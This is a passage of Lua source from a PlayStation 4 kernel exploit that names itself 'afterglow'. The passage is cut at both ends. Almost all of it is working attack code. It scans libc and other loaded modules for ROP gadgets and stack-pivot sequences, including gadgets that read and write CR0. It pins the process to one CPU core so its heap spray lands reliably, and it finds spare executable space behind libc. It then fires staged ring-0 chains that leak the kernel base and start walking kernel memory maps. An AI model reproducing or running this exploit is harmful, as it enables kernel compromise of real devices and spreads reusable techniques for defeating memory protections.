                return at, rsp_disp, rip_disp
            end
        end
        pos = at + 1
    end
end

local function scan_tail(text, from, limit)
    local extra, i, ok = 0, from, false
    while i <= from + (limit or 20) do
        local c = text:byte(i)
        if not c then break end
        if c >= 0x58 and c <= 0x5f then extra = extra + 1; i = i + 1
        elseif c == 0x90 then i = i + 1
        elseif c == 0x41 and text:byte(i + 1) and text:byte(i + 1) >= 0x58
               and text:byte(i + 1) <= 0x5f then
            extra = extra + 1; i = i + 2
        elseif c == 0xc3 then ok = true; break
        else break end
    end
    return ok, extra
end

function AG.scan_pivot(text, from)
    for _, f in ipairs(PIVOT_FORMS) do
        local prefix, displen, mode = f[1], f[2], f[3]
        local bin = hex_to_binary(prefix)
        local pos = from or 1
        while true do
            local at = text:find(bin, pos, true)
            if not at then break end
            local disp = 0
            local have = true
            for i = 0, displen - 1 do
                local b = text:byte(at + #bin + i)
                if not b then have = false; break end
                disp = disp + b * 2^(8 * i)
            end

            if have and displen == 1 and disp >= 0x80 then disp = disp - 0x100 end
            if have and disp >= -0x100 and disp <= 0x800 and (at - 1) >= MIN_GADGET_OFF then
                local ok, extra = scan_tail(text, at + #bin + displen)
                if ok then return at, extra, prefix, disp, mode end
            end
            pos = at + 1
        end
    end
    return nil
end

function AG.resolve_gadgets(libc)
    libc = U(libc)
    local lib = AG.find_libc()

    local size, how = AG.libc_window(libc, lib)
    if not size then return nil, how end
    if size > 0x800000 then size = 0x800000 end
    if size < 0x2000 then
        return nil, string.format("libc window is only %d bytes (%s)", size, tostring(how))
    end

    local text = AG.rdbuf(libc, size)
    AG.libc_gadget_text = text
    AG.libc_scan = { start = libc, size = size, how = how }

    local gad, pops, missing = {}, {}, {}

    AG.pop_extra = {}
    for reg, op in pairs(POP_OPCODES) do
        local at, extra, names = AG.scan_pop(text, op)
        if at then
            gad[reg] = libc + (at - 1)
            pops[reg] = extra or 0
            AG.pop_extra[reg] = names
        else
            table.insert(missing, reg)
        end
    end

    if not gad.rdx then
        for _, f in ipairs(RDX_SETTER_FORMS) do
            if gad[f[2]] then
                local a, e = AG.scan_seq(text, f[1])
                if a then
                    gad.rdx_set = libc + (a - 1)
                    AG.rdx_source = f[2]
                    pops.rdx_set = e or 0
                    break
                end
            end
        end
        if gad.rdx_set then
            for i = #missing, 1, -1 do
                if missing[i] == "rdx" then table.remove(missing, i) end
            end
        end
    end

    local pivot = nil
    do
        local tried = {}

        local SLICE, OVERLAP = 0x100000, 0x40

        local function page_is_code(addr)
            local page = U(addr) - (U(addr).l % 0x1000)
            return i32(syscall.mprotect(page, 0x1000, 5)) == 0
        end

        local function try_window(base, win, name, verify)
            if not base or not win or win <= 0 then return false end
            local off, hit = 0, nil
            while off < win and not hit do

                if not page_is_code(U(base) + off) then
                    table.insert(tried, string.format("%s: unreadable at +0x%x", name, off))
                    break
                end
                local n = math.min(SLICE + OVERLAP, win - off)
                local ok, t2 = pcall(AG.rdbuf, U(base) + off, n)
                if not ok or not t2 then
                    table.insert(tried, string.format("%s: read failed at +0x%x", name, off))
                    return false
                end
                local pos = 1
                while true do
                    local a, e, form, disp, mode2 = AG.scan_pivot(t2, pos)
                    if not a then break end
                    local at = U(base) + off + (a - 1)
                    if (not verify) or page_is_code(at) then
                        hit = { at = at, extra = e, form = form, disp = disp,
                                mode = mode2, where = name }
                        break
                    end
                    pos = a + 1
                end
                off = off + SLICE
            end
            if hit then pivot = hit; return true end
            table.insert(tried, string.format("%s: none in %d bytes", name, win))
            return false
        end

        local found = try_window(libc, size, "libc", false)
        if not found then
            for _, m in ipairs({ { libkernel_base, "libkernel", 0x800000 },
                                 { eboot_base, "eboot", 0x2000000 } }) do
                local base = m[1]
                if base and not zero(base) then
                    local s2, e2 = AG.mapping_span(base)
                    if s2 and e2 then
                        local win = math.min((e2 - uint64(base)):tonumber(), m[3])
                        found = try_window(uint64(base), win, m[2], false)
                    else
                        table.insert(tried, m[2] .. ": no mapping")
                    end
                    if found then break end
                end
            end
        end

        if not found and TUNE.module_sweep then
            local mods = AG.list_modules()
            local maps = AG.vmmap() or {}
            local budget, seen = 24 * 0x100000, 0
            table.insert(tried, string.format("modules: %d loaded, %d mappings", #mods, #maps))

            local function span_of(a)
                a = U(a)
                for _, e in ipairs(maps) do
                    local s2, e2 = e.start, e.stop
                    if (s2.h < a.h or (s2.h == a.h and s2.l <= a.l))
                        and (a.h < e2.h or (a.h == e2.h and a.l < e2.l)) then
                        return s2, e2
                    end
                end
            end

            for _, m in ipairs(mods) do
                if found or budget <= 0 or seen >= 48 then break end
                if not same(m.base, libc) then

                    local s2, e2 = span_of(m.base)
                    if s2 and e2 then
                        local win = math.min((e2 - U(m.base)):tonumber(), 0x1000000)
                        if win >= 0x8000 then
                            seen = seen + 1
                            budget = budget - win
                            found = try_window(m.base, win, m.name, true)
                        end
                    end
                end
            end
            if not found then table.insert(tried, "modules: exhausted") end
        end
        AG.pivot_tried = tried
    end

    if not AG.ret_gadget then
        local r = (gadgets and gadgets["ret"]) or (gad.leave and (gad.leave + 1))
        if r then AG.ret_gadget = uint64(r) end
    end

    if not pivot then
        local at, rsp_disp, rip_disp = AG.find_restore(text)
        if at then
            pivot = { at = libc + (at - 1), extra = 0, where = "libc",
                      form = string.format("rsp<-[frame+0x%x];ret->[frame+0x%x]",
                          rsp_disp, rip_disp),
                      mode = "restore", disp = 0 }
            AG.pivot_rsp_disp = rsp_disp
            AG.pivot_rip_disp = rip_disp
            AG.pivot_tried = AG.pivot_tried or {}
            table.insert(AG.pivot_tried, string.format(
                "pivot: restore form, rsp<-[frame+0x%x], ret->[frame+0x%x]", rsp_disp, rip_disp))
        end
    end

    if not pivot and AG.cfg.use_jmp_pivot then
        local lj = libc_addrofs and libc_addrofs.longjmp
        local sj = libc_addrofs and libc_addrofs.setjmp
        local ret = (gadgets and gadgets["ret"]) or (gad.leave and (gad.leave + 1))
        if lj and sj and ret then
            pivot = { at = uint64(lj), extra = 0, form = "setjmp+longjmp",
                      mode = "jmp", disp = 0 }
            AG.setjmp_addr = uint64(sj)
            AG.longjmp_addr = uint64(lj)
            AG.ret_gadget = uint64(ret)
            AG.pivot_tried = AG.pivot_tried or {}
            table.insert(AG.pivot_tried, "pivot: using setjmp+longjmp")
        end
    end

    if pivot then
        gad.pivot = pivot.at
        pops.pivot = pivot.extra or 0
        local d = pivot.disp or 0
        if pivot.mode == "jmp" then
            AG.pivot_form = "setjmp+longjmp (jmp)"
        elseif pivot.mode == "restore" then
            AG.pivot_form = string.format("%s in %s", tostring(pivot.form),
                tostring(pivot.where))
        else
            AG.pivot_form = string.format("%s in %s %s0x%x", tostring(pivot.form),
                tostring(pivot.where), d < 0 and "-" or "+", math.abs(d))
        end
        AG.pivot_mode = pivot.mode
        AG.pivot_frame_off = d
    else
        table.insert(missing, "pivot")

        local counts = {}
        for _, f in ipairs(PIVOT_FORMS) do
            local bin = hex_to_binary(f[1])
            local n, pos = 0, 1
            while true do
                local at = text:find(bin, pos, true)
                if not at then break end
                n = n + 1
                pos = at + 1
            end
            counts[#counts + 1] = string.format("%s=%d", f[1], n)
        end
        AG.pivot_counts = table.concat(counts, " ")

        AG.pivot_near = {}
        for _, f in ipairs(PIVOT_FORMS) do
            local bin = hex_to_binary(f[1])
            local pos, seen = 1, 0
            while seen < 3 do
                local at = text:find(bin, pos, true)
                if not at then break end
                local from = math.max(1, at - 8)
                local to = math.min(#text, at + 56)
                table.insert(AG.pivot_near, string.format("%s @+0x%x  %s", f[1],
                    at - 1, bin_to_hex(text:sub(from, to))))
                seen = seen + 1
                pos = at + 1
            end
        end
    end

    gad.leak, gad.leak_reg, gad.leak_disp = nil, nil, nil
    for _, f in ipairs(LEAK_FORMS) do
        local at, extra = AG.scan_seq(text, f[1])
        if at then
            local disp = 0
            if f[2] == 1 then
                disp = text:byte(at + #hex_to_binary(f[1])) or 0
            end
            gad.leak = libc + (at - 1)
            gad.leak_reg = f[3]
            gad.leak_disp = disp
            gad.leak_pops = extra or 0
            break
        end
    end

    do
        local a1, e1 = AG.scan_seq(text, "4889c7")
        local a2, e2 = AG.scan_seq(text, "4897")
        gad.rax2rdi = a1 and (libc + (a1 - 1)) or nil
        gad.xchg_ra = a2 and (libc + (a2 - 1)) or nil
        if a1 then pops.rax2rdi = e1 or 0 end
        if a2 then pops.xchg_ra = e2 or 0 end
        gad.rax = nil
        local rp, ep = AG.scan_pop(text, 0x58)
        if rp then gad.rax = libc + (rp - 1); pops.rax = ep or 0 end
        AG.mov_to_rdi = gad.rax2rdi and "rax2rdi" or (gad.xchg_ra and "xchg_ra") or nil

        local sd, sd_pops = AG.scan_seq(text, "8907")
        gad.store_dword = sd and (libc + (sd - 1)) or nil
        if sd then pops.store_dword = sd_pops or 0 end

        local sl, sl_pops = AG.scan_seq(text, "488b00")
        gad.self_load = sl and (libc + (sl - 1)) or nil
        if sl then pops.self_load = sl_pops or 0 end
        if not AG.mov_to_rdi then
            local pp = AG.scan_seq(text, "505f")
            local le = AG.scan_seq(text, "488d38")
            gad.push_pop_rdi = pp and (libc + (pp - 1)) or nil
            gad.lea_rdi_rax = le and (libc + (le - 1)) or nil
            if gad.push_pop_rdi then AG.mov_to_rdi = "push_pop_rdi"
            elseif gad.lea_rdi_rax then AG.mov_to_rdi = "lea_rdi_rax" end
        end
        if gad.self_load then AG.rax_deref = "self_load" end
    end

    do
        local clts = text:find(hex_to_binary("0f06c3"), 1, true)
        local cr0r = text:find(hex_to_binary("0f20c0"), 1, true)
        local cr0w = text:find(hex_to_binary("0f22c0"), 1, true)
        gad.clts = clts and (libc + (clts - 1)) or nil
        gad.cr0_read = cr0r and (libc + (cr0r - 1)) or nil
        gad.cr0_write = cr0w and (libc + (cr0w - 1)) or nil
    end

    for name, pat in pairs(PLAIN_GADGETS) do
        local p = text:find(hex_to_binary(pat), MIN_GADGET_OFF + 1, true)
        if p then gad[name] = libc + (p - 1) else table.insert(missing, name) end
    end

    AG.math_reg, AG.math_is_add, AG.math_form = nil, false, nil
    for _, f in ipairs(ADD_FORMS) do
        if gad[f[2]] then
            local p = text:find(hex_to_binary(f[1] .. "c3"), 1, true)
            if p then
                gad.add = libc + (p - 1)
                AG.math_reg, AG.math_is_add = f[2], true
                AG.math_form = "add rax," .. f[2]
                break
            end
        end
    end
    if not AG.math_reg then
        for _, f in ipairs(SUB_FORMS) do
            if gad[f[2]] then
                local p = text:find(hex_to_binary(f[1] .. "c3"), 1, true)
                if p then
                    gad.sub = libc + (p - 1)
                    AG.math_reg, AG.math_is_add = f[2], false
                    AG.math_form = "sub rax," .. f[2] .. " (off negated)"
                    break
                end
            end
        end
    end
    if not AG.math_reg then table.insert(missing, "add/sub") end
    if not (AG.rax_deref == "self_load" or AG.mov_to_rdi) then
        table.insert(missing, "rax deref")
    end
    if not gad.rax then table.insert(missing, "pop rax") end

    AG.memcpy_src = nil
    if lib.handle then
        local ok, addr = pcall(dlsym, lib.handle, "memcpy")
        if ok and addr and not zero(addr) then
            local a = uint64(addr)
            if a.h == libc.h and a.l >= libc.l and a.l < libc.l + size then
                gad.memcpy = a
                AG.memcpy_src = "dlsym"
            else
                AG.memcpy_note = "dlsym gave " .. hexaddr(a) .. ", outside the window"
            end
        else
            AG.memcpy_note = "dlsym failed: " .. tostring(addr)
        end
    end
    if not gad.memcpy then

        local a = text:find(hex_to_binary("554889e54889f8"), 1, true)
        if a then
            gad.memcpy = libc + (a - 1)
            AG.memcpy_src = "prologue scan"
        end
    end
    if not gad.memcpy then
        table.insert(missing, "memcpy")
    end

    AG.gadgets = gad
    AG.pops = pops
    AG.libc_base = libc

    if AG.cfg.verbose then
        log("    libc window %d bytes, %s", size, tostring(how))
        local names = { "pivot", "rdi", "rsi", "rdx", "rcx", "store", "load",
                        "shr", "shl", "leave", "add", "sub", "memcpy" }
        for _, k in ipairs(names) do
            local note = ""
            if pops[k] and pops[k] > 0 then
                note = string.format(" (+%d: %s)", pops[k],
                    tostring((AG.pop_extra or {})[k] or "?"))
            end
            log("    gadget %-7s %s%s", k, gad[k] and hexaddr(gad[k]) or "MISSING", note)
        end
        if AG.pivot_form then
            if AG.pivot_mode == "jmp" then
                log("    pivot form %s", AG.pivot_form)
            else
                log("    pivot form %s (%s)", AG.pivot_form, tostring(AG.pivot_mode))
            end
        else
            for _, t in ipairs(AG.pivot_tried or {}) do log("    pivot try  %s", t) end
            if AG.pivot_counts then log("    pivot raw  %s", AG.pivot_counts) end
            for _, n in ipairs(AG.pivot_near or {}) do log("    pivot near %s", n) end
        end
        if AG.math_form then log("    arithmetic %s", AG.math_form) end
        if AG.rdx_source then
            log("    rdx via %s%s", AG.rdx_source,
                (pops.rdx_set or 0) > 0 and string.format(" (+%d pop)", pops.rdx_set) or "")
        end
        if AG.memcpy_src then log("    memcpy via %s", AG.memcpy_src) end
        log("    rax deref: self_load=%s(+%d pop) mover=%s",
            tostring(gad.self_load and hexaddr(gad.self_load) or "-"),
            pops.self_load or 0, tostring(AG.mov_to_rdi or "-"))
        log("    mov gadgets: rax2rdi=%s xchg=%s pop_rax=%s store_dword=%s",
            gad.rax2rdi and hexaddr(gad.rax2rdi) or "-",
            gad.xchg_ra and hexaddr(gad.xchg_ra) or "-",
            gad.rax and hexaddr(gad.rax) or "-",
            gad.store_dword and hexaddr(gad.store_dword) or "-")
        log("    cr0 gadgets: clts=%s read=%s write=%s",
            gad.clts and hexaddr(gad.clts) or "-",
            gad.cr0_read and hexaddr(gad.cr0_read) or "-",
            gad.cr0_write and hexaddr(gad.cr0_write) or "-")
        if gad.leak then
            log("    leak gadget %s <- [rdi+0x%x] @%s", gad.leak_reg,
                gad.leak_disp or 0, hexaddr(gad.leak))
        else
            log("    leak gadget MISSING (no `mov [rdi], rsp/rbp/r12..` form)")
        end
        if AG.memcpy_note and not gad.memcpy then log("    memcpy note %s", AG.memcpy_note) end
        if #missing > 0 then log("    missing  %s", table.concat(missing, ",")) end
    end

    if #missing > 0 then return gad, table.concat(missing, ",") end
    return gad, nil
end

-- The page behind libc text: executable, and claimed by no ELF header.
function AG.find_room(lib)
    local scan = AG.libc_scan
    local text = AG.libc_gadget_text
    if not (scan and text) then
        return nil, "the libc scan window is not known yet"
    end

    local size = #text
    local need = 0x940 + 0x20

    local align = (0x1000 - (scan.start.l % 0x1000)) % 0x1000
    local off = align
    while off + ROOM_SIZE <= size do
        local chunk = text:sub(off + 1, off + ROOM_SIZE)
        local tail = chunk:match("(%z*)$")
        local t = tail and #tail or 0
        if t >= need then
            local free_rel = off + (ROOM_SIZE - t)
            free_rel = free_rel + (16 - free_rel % 16) % 16
            local page = scan.start + off
            local room = {
                page = page,
                free = scan.start + free_rel,
                last = page + ROOM_SIZE,
                seg_start = scan.start,
                seg_size = scan.size,
            }

            if (room.last - room.free):tonumber() < 0x940 then
                off = off + ROOM_SIZE
            else
                AG.room = room
                return room
            end
        else
            off = off + ROOM_SIZE
        end
    end

    return nil, "no zeroed page inside libc text"
end

function AG.pin_to(core)
    local mask = AG.alloc(16)
    AG.zero(mask, 16)
    memory.write_byte(mask + math.floor(core / 8), 2^(core % 8))
    return i32(syscall.cpuset_setaffinity(3, 1, -1, 16, mask)) == 0
end

function AG.unpin_all(cores)
    local mask = AG.alloc(16)
    AG.zero(mask, 16)
    for _, core in ipairs(cores or {}) do
        memory.write_byte(mask + math.floor(core / 8), 2^(core % 8))
    end
    i32(syscall.cpuset_setaffinity(3, 1, -1, 16, mask))
end

-- os.clock() is wall time here and cores differ by more than an order of
-- magnitude, so the spray window is decided by which core is picked.
function AG.pin_core()
    local mask = AG.alloc(16)
    AG.zero(mask, 16)

    local rv = i32(syscall.cpuset_getaffinity(3, 1, -1, 16, mask))
    if rv ~= 0 then
        return { ok = false, note = "getaffinity rv=" .. rv .. " errno " .. errno_str() }
    end

    local allowed = {}
    for b = 0, 127 do
        local byte = memory.read_byte(mask + math.floor(b / 8)):tonumber()
        if math.floor(byte / 2^(b % 8)) % 2 == 1 then table.insert(allowed, b) end
    end
    if #allowed == 0 then return { ok = false, note = "no core in the mask" } end

    AG.cached_cores = allowed

    if AG.cfg.measure_cores and #allowed > 1 then
        local best, bestcore, samples = nil, nil, 16
        for _, core in ipairs(allowed) do
            if AG.pin_to(core) then
                local t0 = now_ms()
                for _ = 1, samples do syscall.getuid() end
                local t1 = now_ms()
                local per = (t1 - t0) / samples
                if not best or per < best then best, bestcore = per, core end
            end
        end
        if bestcore and AG.pin_to(bestcore) then
            return {
                ok = true, core = bestcore, allowed = table.concat(allowed, ","),
                original = allowed,
                note = string.format("measured %.0f us/call, best of [%s]",
                    best * 1000, table.concat(allowed, ",")),
            }
        end
    end

    local versuche = {}
    for i = #allowed, 1, -1 do
        local core = allowed[i]
        AG.zero(mask, 16)
        memory.write_byte(mask + math.floor(core / 8), 2^(core % 8))
        local r = i32(syscall.cpuset_setaffinity(3, 1, -1, 16, mask))
        table.insert(versuche, core .. ":rv" .. r)
        if r == 0 then
            return {
                ok = true, core = core, allowed = table.concat(allowed, ","),
                original = allowed,
                note = (#versuche > 1) and ("setaffinity ok after " .. table.concat(versuche, " "))
                       or "setaffinity rv=0",
            }
        end
    end
    return { ok = false, allowed = table.concat(allowed, ","),
             note = "every allowed core refused: " .. table.concat(versuche, " ") }
end

function AG.unpin(pin)
    if not (pin and pin.ok and pin.original) then return end
    local mask = AG.alloc(16)
    AG.zero(mask, 16)
    for _, core in ipairs(pin.original) do
        memory.write_byte(mask + math.floor(core / 8), 2^(core % 8))
    end
    local rv = i32(syscall.cpuset_setaffinity(3, 1, -1, 16, mask))
    if rv ~= 0 then
        log("    affinity left on core %d (restore rv=%d) -- harmless, the run wants a pin anyway",
            pin.core, rv)
    end
end

function AG.vmmap()
    local pid = i32(syscall.getpid())
    if pid < 0 then return nil, "getpid failed" end

    local mib = AG.alloc(16)
    AG.wr4(mib + 0, 1)
    AG.wr4(mib + 4, 14)
    AG.wr4(mib + 8, 32)
    AG.wr4(mib + 12, pid)

    local len = AG.alloc(8)
    AG.wr8(len, 0)
    local rv = i32(syscall.sysctl(mib, 4, 0, len, 0, 0))
    local need = AG.rd8(len):tonumber()
    if rv ~= 0 or not need or need <= 0 then
        return nil, "vmmap sizing rv=" .. tostring(rv)
    end

    local buf = AG.alloc(need + 0x8000)
    AG.wr8(len, need + 0x8000)
    rv = i32(syscall.sysctl(mib, 4, buf, len, 0, 0))
    local used = math.min(AG.rd8(len):tonumber() or 0, need + 0x8000)
    if rv ~= 0 or used <= 0 then
        return nil, "vmmap read rv=" .. tostring(rv)
    end

    local data = AG.rdbuf(buf, used)
    local maps = {}
    local off = 0
    while off + 8 <= used do
        local sz = memory.read_dword(buf + off):tonumber()
        if sz == nil or sz <= 0 or off + sz > used then break end
        local prot = nil
        if off + 0x60 <= used then
            prot = memory.read_dword(buf + off + 0x5c):tonumber()
        end

        local start_a = qw(data, off + 8)
        local stop_a = qw(data, off + 16)
        local span = (stop_a.h - start_a.h) * 2^32 + (stop_a.l - start_a.l)
        local plausible = sz >= 0x20
            and start_a.h < 0x10000
            and (stop_a.h > start_a.h or (stop_a.h == start_a.h and stop_a.l > start_a.l))
            and span >= 0x1000 and span <= 0x40000000
        if plausible then
            table.insert(maps, { start = start_a, stop = stop_a, prot = prot })
        end
        off = off + sz
    end
    return maps
end

function AG.attempt(opts)
    opts = opts or {}
    STATE.retry = false

    local fw = AG.cfg.fw_override or FW_VERSION
    local K = FIRMWARE[fw]
    local PATCHES = PATCH_TABLE[fw]
    local BOOTSTRAP = BOOTSTRAP_TABLE[fw]
    if not (K and PATCHES and BOOTSTRAP) then
        if fw == nil then
            warn("this host does not set FW_VERSION -- set cfg.fw_override")
        else
            warn("no kernel stage for firmware %s -- refusing", tostring(fw))
        end
        warn("this build carries: %s", table.concat(AG.supported_fws(), ", "))
        return false
    end
    AG.padding = K.padding

    log("afterglow -- ps4 kernel exploit, firmware %s (lua host)", tostring(fw))

    local missing = AG.resolve_syscalls()
    if #missing > 0 then
        warn("no libkernel stub for syscall %s -- stopping here", table.concat(missing, ","))
        return false
    end

    local pin = AG.pin_core()
    if not pin.ok then
        warn("cpu pin failed (%s) -- refusing to go on.", pin.note)
        warn("Unpinned, the free and the refill land in different per cpu buckets,")
        warn("the hole is filled by somebody else, and ring 0 continues on that")
        warn("stranger's stack pointer. That is a dead console, not a bad run.")
        return false
    end
    log("  pinned to core %d of [%s]", pin.core, pin.allowed)

    do
        local m0 = syscall.mmap(0, 0x4000, 3, 0x1002, -1, 0)
        if m0:tonumber() ~= -1 and i32(syscall.mprotect(m0, 0x4000, 7)) == 0 then
            warn("  this kernel is already open -- a run has succeeded on this boot.")
            warn("  Not firing again; reboot the console for a fresh one.")
            return false
        end
    end

    local lib = AG.find_libc()
    if not lib.base then
        warn("  %s", lib.note or "libc is not mapped")
        return false
    end
    log("  libc %s (%s)", hexaddr(lib.base), tostring(lib.at))

    local gad, gmiss = AG.resolve_gadgets(lib.base)
    if gmiss then
        warn("  gadget %s is missing -- this is not a libc build we can use", tostring(gmiss))
        return false
    end

    local room = AG.find_room(lib)
    if not room then
        warn("  no usable room behind libc text")
        return false
    end
    log("  room %s, %d bytes free", hexaddr(room.page), (room.last - room.free):tonumber())

    AG.libc_gadget_text = nil
    pcall(collectgarbage, "collect")

    local shot = shooter(gad)

    if AG.pivot_mode == "jmp" then
        AG.jmpbuf = AG.alloc(0x60)
        AG.zero(AG.jmpbuf, 0x60)
        local r0 = shot:take(nil, nil, { fn = AG.setjmp_addr, arg = AG.jmpbuf })
        local raw = AG.rdbuf(AG.jmpbuf, 0x40)
        local rip, jrsp, jrbp = qw(raw, 0), qw(raw, 0x10), qw(raw, 0x18)
        log("[0] setjmp shot: chain=%s rip=%s rsp=%s rbp=%s",
            tostring(r0), hexaddr(rip), hexaddr(jrsp), hexaddr(jrbp))
        if not in_text(rip) or zero(jrsp) or zero(jrbp) then
            warn("[0] setjmp did not land inside the kernel -- not going on")
            STATE.retry = true
            return false
        end
        AG.jb_saved = { rip = rip, rsp = jrsp, rbp = jrbp }
    end

    if AG.cfg.idle_first_shot then
        log("[1a] idle shot: reclaim, pivot, chain = leave;ret only")
        local r0 = shot:take(function(c) end)
        log("[1a] idle shot returned: queue=%s sprays=%d window=%.1f ms",
            tostring(r0), shot.sprayed, shot.window or 0)
        if AG.cfg.idle_only then
            log("[1a] idle_only is set -- stopping here. If this line arrived,")
            log("      the pivot and the return path work; set idle_only=false to go on.")
            return { idle = true }
        end
    end

    if AG.cfg.one_read_only then
        local box = AG.alloc(0x10)
        AG.zero(box, 0x10)
        log("[1q] single read: rax = *(rax) once, store it, return")
        local r0 = shot:take(function(c)
            c:gad_tail("self_load")
            c:rdi(box); c:gad("store")
        end, 0x400)
        local v = qw(AG.rdbuf(box, 8), 0)
        log("[1q] returned queue=%s  *(rax) = %s", tostring(r0), hexaddr(v))
        log("[1q] one_read_only is set -- stopping here.")
        return { idle = true }
    end

    if AG.cfg.leak_aligned_only then
        local box = AG.alloc(0x20)
        AG.zero(box, 0x20)
        log("[1a2] store rax and (rax & ~0xfff), then return -- no kernel read")
        local r0 = shot:take(function(c)
            c:rdi(box); c:gad("store")
            c:gad("rcx"); c:num(12); c:gad("shr"); c:gad("shl")
            c:rdi(box + 8); c:gad("store")
        end, 0x400)
        local raw = AG.rdbuf(box, 0x10)
        local rax, aligned = qw(raw, 0), qw(raw, 8)
        log("[1a2] returned queue=%s  rax=%s  aligned=%s",
            tostring(r0), hexaddr(rax), hexaddr(aligned))
        log("[1a2]   rax low14=0x%x  aligned low14=0x%x  aligned in direct-map:%s",
            rax.l % 0x4000, aligned.l % 0x4000, tostring(in_heap(aligned)))
        log("[1a2] leak_aligned_only is set -- stopping here.")
        return { idle = true }
    end

    if AG.cfg.probe_memcpy_user then
        local box = AG.alloc(0x80)
        AG.zero(box, 0x80)
        AG.wrbuf(box + 0x30, "ABCDEFGHIJKLMNOP")
        log("[1m] memcpy self-test: copy 16 user bytes to user bytes (no kernel read)")
        local r0 = shot:take(function(c) c:put(box + 0x40, box + 0x30, 0x10) end, 0x400)
        local got = AG.rdbuf(box + 0x40, 16)
        log("[1m] returned queue=%s  copied = %q", tostring(r0), got)
        if got == "ABCDEFGHIJKLMNOP" then
            log("[1m] memcpy works in ring 0 -> the fault is the kernel read itself")
        else
            log("[1m] memcpy did NOT copy -> the routine itself is the problem")
        end
        log("[1m] probe_memcpy_user is set -- stopping here.")
        return { idle = true }
    end

    if AG.cfg.probe_read then
        local box = AG.alloc(0x60)
        AG.zero(box, 0x60)
        log("[1s] split shot: store aligned rax, then memcpy 16 bytes of it")
        local r0 = shot:take(function(c)
            c:gad("rcx"); c:num(12); c:gad("shr"); c:gad("shl")
            c:rdi(box); c:gad("store")
            c:grab(box + 0x20, 0x10)
        end, 0x400)
        local raw = AG.rdbuf(box, 0x40)
        local aligned = qw(raw, 0)
        log("[1s] returned queue=%s sprays=%d", tostring(r0), shot.sprayed)
        log("[1s]   aligned = %s (direct-map:%s)", hexaddr(aligned), tostring(in_heap(aligned)))
        log("[1s]   first 16 bytes at that address: %s", bin_to_hex(AG.rdbuf(box + 0x20, 16)))
        log("[1s] probe_read is set -- stopping here.")
        return { idle = true }
    end

    if AG.cfg.leak_rax_only then
        local box = AG.alloc(16)
        AG.zero(box, 16)
        log("[1r] value shot: chain = pop rdi; mov [rdi],rax; leave")

        local r0 = shot:take(function(c) c:save_rax(box) end, 0x400)
        local rax = qw(AG.rdbuf(box, 8), 0)
        log("[1r] returned queue=%s sprays=%d", tostring(r0), shot.sprayed)
        log("[1r]   rax = %s  (text:%s direct-map:%s low14:0x%x)",
            hexaddr(rax), tostring(in_text(rax)), tostring(in_heap(rax)), rax.l % 0x4000)
        log("[1r] leak_rax_only is set -- stopping here.")
        return { idle = true }
    end

    local kbase = STATE.base
    if kbase then
        log("[1] base %s, carried over from this boot", hexaddr(kbase))
    else
        local win_at = AG.alloc(TUNE.window + 16)
        AG.zero(win_at, TUNE.window + 16)

        local r = shot:take(function(c)

            c:gad("rcx"); c:num(12); c:gad("shr"); c:gad("shl")
            c:copy_from_rax(win_at, TUNE.window)
        end, TUNE.window * 16)

        local win = AG.rdbuf(win_at, TUNE.window)

        local found = nil
        local off = 0
        while off <= TUNE.window - 0x20 do
            local a = qw(win, off)
            if a.h == 0xffffffff then
                local b = qw(win, off + 8)
                local c2 = qw(win, off + 0x10)
                local d = qw(win, off + 0x18)
                if b.h == 0xffffffff and c2.h == 0xffffffff and d.h == 0xffffffff
                    and (b.l - a.l) % 2^32 == 0x20
                    and (c2.l - a.l) % 2^32 == 0x40
                    and (d.l - a.l) % 2^32 == 0x50 then
                    found = a
                    break
                end
            end
            off = off + 8
        end

        local voted = nil
        do
            local mark = K.anchor % 0x4000
            local tally = {}
            local o = 0
            while o <= TUNE.window - 8 do
                local a = qw(win, o)
                if a.h == 0xffffffff and a.l ~= 0xffffffff and a.l % 0x4000 == mark then
                    local b = (a.l - K.anchor) % 2^32
                    if b % 0x4000 == 0 then
                        tally[b] = (tally[b] or 0) + 1
                    end
                end
                o = o + 8
            end
            local best, top, second = nil, 0, 0
            for b, n in pairs(tally) do
                if n > top then
                    second = top; best = b; top = n
                elseif n > second then
                    second = n
                end
            end
            if best ~= nil and top > second then
                voted = U64(best + K.anchor, 0xffffffff)
            end
        end

        if found and voted and not same(found, voted) then
            warn("[1] the two readings disagree: %s against %s -- stopping here",
                hexaddr(found), hexaddr(voted))
            return false
        end
        found = found or voted
        if found and ((found.l - K.anchor) % 2^32) % 0x4000 ~= 0 then
            warn("[1] %s is not on the 16 KiB grid -- not a base, stopping here", hexaddr(found))
            return false
        end

        log("[1] leak: queue=%s sprays=%d anchor=%s%s",
            tostring(r), shot.sprayed,
            found and hexaddr(found) or "missed",
            (found and voted and same(found, voted)) and " (both readings agree)" or "")

        if not found then
            if r == nil and shot.sprayed == 0 then
                warn("    no free apm unit left -- this boot is spent, reboot the console.")
            else
                warn("    the spray did not take")
                STATE.retry = true
            end
            return false
        end

        kbase = plus(found, -K.anchor)
        STATE.base = kbase
        log("    base %s", hexaddr(kbase))
        AG.on_screen("base " .. hexaddr(kbase))
    end

    local function kat(rva) return kbase + rva end

    local probe_fd, node = -1, nil
    for _, p in ipairs(AG.cfg.probe_nodes) do
        local fd = i32(syscall.open(p, 0))
        if fd >= 0 then
            probe_fd, node = fd, p
            break
        end
    end
    if probe_fd < 0 then
        warn("[2] no device node opened for the probe descriptor")
        return false
    end

    do
        local back = AG.rdbuf(room.free, (room.last - room.free):tonumber())
        if back:find("[^%z]") then
            warn("[2] the spare room behind libc is occupied -- nothing written")
            return false
        end
    end
    log("[2] probe fd %d on %s, %d bytes of spare room behind libc",
        probe_fd, node, (room.last - room.free):tonumber())

    local reach = TUNE.entries
    local maps_list, why = AG.vmmap()
    if maps_list then
        for i, e in ipairs(maps_list) do
            local page = room.page
            if (e.start.h < page.h or (e.start.h == page.h and e.start.l <= page.l))
                and (page.h < e.stop.h or (page.h == e.stop.h and page.l < e.stop.l)) then
                reach = math.min(TUNE.entries, i + 2)
                break
            end
        end
        log("[3a] vmmap: %d mappings, walking %d entries", #maps_list, reach)
    else
        log("[3a] vmmap unavailable (%s) -- walking the full %d entries",
            tostring(why), reach)
    end

    local note = AG.alloc(128)
    local ftab = AG.alloc(0x100)
    local maps = AG.alloc(TUNE.entries * TUNE.stride + 0x100)
    AG.zero(note, 128)
    AG.zero(ftab, 0x100)
    AG.zero(maps, TUNE.entries * TUNE.stride)

    local function walk_loop(c)
        for k = 0, reach - 1 do
            if k == 0 then
                log("[3b] building walk: reach=%d stride=0x%x maps=%s",
                    reach, TUNE.stride, hexaddr(maps))
            end
            local src = c:grab(maps + k * TUNE.stride, TUNE.stride)
